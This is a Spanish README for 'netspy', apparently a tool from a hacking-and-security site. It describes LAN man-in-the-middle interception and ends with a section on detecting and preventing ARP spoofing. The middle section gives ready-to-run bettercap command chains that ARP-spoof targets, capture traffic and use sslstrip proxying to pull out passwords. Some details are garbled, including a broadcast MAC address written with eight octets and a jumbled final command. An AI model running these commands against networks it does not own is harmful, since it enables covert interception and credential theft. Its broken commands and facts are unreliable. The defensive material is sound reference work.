# Interceptacion Ethernet (MiTM)  de trafico LAN en claro:

### Estenarios:

## 1º.- Interceptación entre 2 dispositivos; 

•	Disponer de acceso y privilegios suficientes en uno de los 2 dispositivos A --//...B , e instalar, para interceptar el tráfico de algún interfaces, en alguno de los extremos: Wireshark, dsniff, Smartsnif nifsoft, Bettercap, Ethercap, Extension navegador, netspy, tcpdump, malware, etc..

## 2º.- red LAN con HUB o switch basico "sin inteligencia"

•	Instalar un HUB en el medio de una red, por su modo de funcionamiento rebotan todos los pquete en todas las MAC y paquete Ethernet, par interceptación.

•	Instalar un PC conectado al HUB, con la tarjeta de red en modo promiscuo, que escuche todo el tráfico de la red. Tener instalado Wireshark, netspy,etc.

•	Modificar MAC adreess de un PC conectado a la red, con la MAC Broadcast FF:FF:FF:FF:FF:FF:FF:FF que escuche todo el tráfico de la red. 

•	Modificar MAC address de un PC y suplantar la de otro dispositivo objetivo, para escuchar el trafico 

## 3º.- En una red LAN con conmutadores Switch inteligente configurable :

•	Configurar port mirroning en el switch para que una copia de todo el trafico se encamine a una sola ethernet del switch, donde hay un PC en modo promiscuo con Wirehark, netspy, etc.. capturando

•	En un PC conectado a la red instalar un Proxy, para hacer pasar, encaminar por configuracion o por ARP Spoofing, ¡el trafico por el e interceptar el trafico!

•	En un PC conectado instala un Proxy trasparente. Usa ARP Spoofing, suplantación de MAC, ¡para encaminar y poder ver e interceptar el trafico de otros dispositivos!

## 4º.- 6.	Posibilidad de añadir e instalar dispositivos HW:  pasarelas, FW , routers, swithes, etc.. equipos en medio de las redes para interceptación: HUBS, switches port mirronig, proxyes, TAB ..,,etc..

<img style="float:left" alt="Escenarios interceptacion" src="https://github.com/hackingyseguridad/netspy/blob/master/MiTM.png">

### https://www.bettercap.org/ Beettercap combina ARP Spoofing y proxy trasparte

<img style="float:left" alt="netspy logo" src="https://github.com/hackingyseguridad/netspy/blob/master/netspy.png">

# netspy

## 1.- Descubre elementos de red 2.- Captura y muestra en pantalla el trafico.

## Instalacion:

apt-get install bettercap

apt-get install netdiscover

git clone https://github.com/hackingyseguridad/netspy

cd netspy

chmod 777 netspy

## Uso.:

sh netspy

sh proxynetspy

netdiscover

IMPORTANTE: Para salir del modo de descubrimiento 'net probe on' y empezar a esnifar teclea 'exit'.

## Bettercap v2.9

Escanear toda la Red:

net.probe on; ticker on

Banear tarjet IP con ARP:

set arp.spoof.targets IP; arp.spoof on; set arp.ban on; net.probe on

Capturar trafico en fichero siff_all.pcap:

net.probe on; set arp.spoof.targets; arp.spoof on; set net.sniff.output /tmp/sniff_all.pcap; set net.sniff.verbose false; net.sniff on

Ver Trafico:

net.probe on; set arp.spoof.targets; arp.spoof on; set net.sniff.verbose false; net.sniff on

Ver trafico web por proxy y extrae claves:

net.probe on; set arp.spoof.targets; arp.spoof on; set net.sniff.verbose false; net.sniff on; http.proxy on; set http.proxy.sslstrip true

Ver trafico web por proxy y extrae claves de cifrados debiles:

net.probe on; set arp.spoof.targets; arp.spoof on; set net.sniff.verbose false; net.sniff on; http.proxy on;  true; set http.proxy.port 80; set https.proxy.port 443; http.proxy on; https.proxy on; set http.proxy.sslstrip

Versiones antiguas Bettercap: 1.6.1 y 1.6.2 en Python


 para hacer interceptación de datos en claro; salvo que: exista  posibilidad  de: acceso a dispositivos/equipos con privilegios suficientes para instalar software y ser utilizado para hacer MiTM,  comprometerlos ,  (malware) o añadir nuevo hardware con pequeños dispositivos ethernet espía, o que tengamos posibilidad de conectar, añadir e instalar, en la red LAN físicamente algún dispositivo;  como elemento común será necesario   hacer ARP Spoofing y/o un proxy trasparente; el ARP spoofing, o envenenamiento ARP es un tipo de ataque fácil de realizar, sigiloso que puede afectar la seguridad de una red local no segmentada. Consiste en la falsificación, manipulación de la MAC address y por tanto tabla ARP de un dispositivo para “redirigir el tráfico de red” hacia el atacante, permitiéndole interceptar  la información que fluye por la red. 

Cómo detectar un ataque de ARP Spoofing!

•	Este tipo de ataque suele ser silencioso y difícil de detectar, es fundamental contar con herramientas y/o técnicas específicas. P.ej.:

1.	Herramientas de detección, ataques de ARP Spoofing, MiTM:

•	Sistemas de detección de intrusiones (IDS): Un Sistema de Detección de Intrusiones IDS bien configurado puede detectar anomalías en el tráfico de red, como un aumento repentino en el número de solicitudes ARP o respuestas ARP falsas.

•	Sniffers de paquetes: Herramientas como p.ej. Wireshark, permiten analizar el tráfico de red en tiempo real. Al examinar los paquetes ARP,  permite identificar patrones inusuales o respuestas ARP falsas.

•	Herramientas especializadas: Existen herramientas diseñadas específicamente para detectar ARP Spoofing, como ARPwatch, que monitorea la tabla ARP y alerta sobre cambios inesperados.

2.	Técnicas de detección de ataques de interceptación MiTM, ARP Spoofing : 

•	Problemas de conectividad: Dificultad para acceder a ciertos sitios web o servicios de red. .  Error de certificado en los navegadores web!Pérdida de paquetes: Interrupciones en la comunicación o lentitud en la red. Alertas de seguridad: Utiliza herramientas de detección de intrusiones (IDS) y sistemas de prevención de intrusiones (IPS) que puedan identificar y alertar sobre actividades sospechosas en la red. Actividad sospechosa en la red: Detección de tráfico no autorizado o intentos de acceso a recursos sensibles. Conexiones no autorizadas: Monitorizar conexiones activas en tu red para identificar dispositivos no autorizados que podrían estar interceptando el tráfico.

•	Monitoreo de la tabla ARP: Revisa regularmente la tabla ARP de los dispositivos de tu red para identificar entradas desconocidas o duplicadas. ARP Spoofing: Verifica la tabla ARP de tus dispositivos para detectar entradas duplicadas o inconsistentes, lo que podría indicar un ataque de envenenamiento de caché ARP. Prevención del ARP Spoofing: • Configuraciones estáticas: Establece entradas ARP estáticas para dispositivos críticos, como routers y servidores. habilitar "client isolation".

•	Tráfico inusual: Monitorea el tráfico de red en busca de patrones inusuales o picos de actividad que no coincidan con el uso normal.

•	Análisis de registros: Examina los registros del sistema y de las herramientas de seguridad para buscar cualquier indicio de actividad sospechosa, como intentos de acceso no autorizados o cambios en la configuración de la red.

•	Pruebas de penetración: Realiza pruebas de penetración periódicas para identificar vulnerabilidades en tu red y evaluar la efectividad de tus medidas de seguridad.

•	Implementar nuevo estándar de ARP firmado con certificado y clave PKI; Uso de protocolos de seguridad: Implementa protocolos de seguridad como DHCP Snooping, IP Source Guard y Dynamic ARP Inspection (DAI), que pueden ayudar a prevenir y detectar ataques de ARP Spoofing. Cambios inesperados en la configuración de red: Modificaciones no autorizadas en la configuración de los dispositivos de red.

•	Segmentación de redes: Divide tu red en segmentos más pequeños para limitar el impacto de un posible ataque. • Actualizaciones de software: Mantén todos tus dispositivos actualizados con los últimos parches de seguridad.  Implementar medidas de seguridad como el uso de VPNs, conexiones HTTPS, y mantener tu infraestructura de red actualizada también puede ayudar a prevenir estos ataques





## http://www.hackingyseguridad.com
